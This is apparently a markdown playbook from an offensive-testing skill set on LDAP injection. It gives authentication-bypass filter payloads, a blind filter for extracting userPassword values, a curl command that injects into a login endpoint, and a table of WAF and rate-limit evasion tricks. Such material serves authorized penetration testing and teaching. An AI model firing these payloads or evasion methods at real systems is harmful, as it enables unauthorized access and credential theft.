---
name: net-15-ldap-injection
sequence: net-15
category: injection
domain: net
description: "LDAP injection in network context: authentication bypass via filter injection, blind attribute extraction, wildcard/OR injection, and special-character escaping in LDAP queries."
wordlist_ref: "wordlists/network/net-07-ldap-ad/"
---

# Net 15 Ldap Injection — Offensive Methodology

## Shortcut
1. Identify LDAP-backed auth endpoints
2. Inject filter-breaking chars: * ) ( | &
3. Bypass auth: *)(uid=*))(|(uid=*
4. Extract attributes blind: (&(uid=admin)(userPassword=a*))

## Detection
```bash
# Test LDAP injection
curl -d "user=admin*)(uid=*))(|(uid=*" https://target.com/login
```


## Hacker Mindset

**LDAP injection is about filter structure.** Close the existing filter, inject OR conditions. `*)(uid=*))(|(uid=*` bypasses most auth checks.

## Chaining & Escalation

Chain this finding with others for higher impact. Combine low-severity findings into critical attack chains. Always think: what's the next step after this works?

## OOB Detection & Blind Confirmation

Use Burp Collaborator or Interactsh for blind detection. Always set up OOB before firing payloads. Time-based: inject sleep(5) and measure response delay.

## Bypass Techniques

| Filter/Block | Bypass |
|-------------|--------|
| WAF block | Encoding, case variation, comment injection |
| Input sanitization | Double encoding, Unicode, null bytes |
| Rate limiting | X-Forwarded-For rotation, HTTP/2 multiplex |
| Blacklist | Alternative syntax, polyglot payloads |

## Tools

- Burp Suite
- curl / httpx
- Nuclei templates
- Custom Python scripts

## Wordlist Invocation

**Wordlist**: `wordlists/network/net-07-ldap-ad/` (1 payload files)

**Workflow**:
1. Start with `low` stage payloads — minimal risk probes
2. If signals detected, escalate to `med` stage
3. Use `high` only after confirmation (OOB/time-based where applicable)

**Tools**: curl, httpx, Burp Suite, or any HTTP client

